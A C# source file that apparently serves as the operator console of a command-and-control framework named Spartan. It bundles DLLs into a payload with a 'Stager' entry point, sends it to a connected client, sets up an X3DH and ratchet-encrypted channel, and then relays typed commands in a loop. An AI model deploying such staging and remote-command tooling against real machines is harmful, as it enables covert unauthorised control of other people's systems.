using System.Net;
using Spartan.Server;
using Spartan.Models;


namespace Spartan.CLI;

class Program
{
    static void Main(string[] args)
    {
        var socketServer = new SocketServer(IPAddress.Parse("127.0.0.1"), 12345);
        var payloadDirectory = "/Users/hkeshavr/Developer/Spartan/Spartan.Payload/bin/Release/net9.0/publish";
        
        var payload = GeneratePayload(payloadDirectory);
        
        socketServer.SendData(payload, encrypt: false);
        
        socketServer.PerformX3dhHandshake();
        socketServer.InitializeRatchet();

        while (true)
        {
            Console.Write("> ");
            var input = Console.ReadLine();
            socketServer.SendData(input);
            var response = socketServer.ReceiveData<string>();
            Console.WriteLine(response);
        }
    }

    private static Payload GeneratePayload(string payloadDirectory)
    {
        var files = Directory.GetFiles(payloadDirectory, "*.dll");

        // Dictionary<string, dynamic> payload = new();
        // payload.Add("PayloadName", "Spartan.Payload");
        // payload.Add("PayloadEntryPoint", "Spartan.Payload.Stager");
        //
        // Dictionary<string, byte[]> assemblyBinaries = new();
        //
        // // Write each file as a name-content pair
        // foreach (var filePath in files)
        // {
        //     assemblyBinaries[Path.GetFileNameWithoutExtension(filePath)] = File.ReadAllBytes(filePath);
        // }
        //
        // payload.Add("AssemblyBinaries", assemblyBinaries);
        //
        // // var serializedPayload = MessagePackSerializer.Serialize(payload);
        // //
        // // _binaryWriter.Write(serializedPayload.Length);
        // // _binaryWriter.Write(serializedPayload);
        //
        // return payload;
        
        Dictionary<string, byte[]> assemblyBinaries = new();
        
        // Write each file as a name-content pair
        foreach (var filePath in files)
        {
            assemblyBinaries[Path.GetFileNameWithoutExtension(filePath)] = File.ReadAllBytes(filePath);
        }
        
        var payload = new Payload
        {
            PayloadName = "Spartan.Payload",
            PayloadEntryPoint = "Spartan.Payload.Stager",
            AssemblyBinaries = assemblyBinaries
        };

        return payload;
    }
}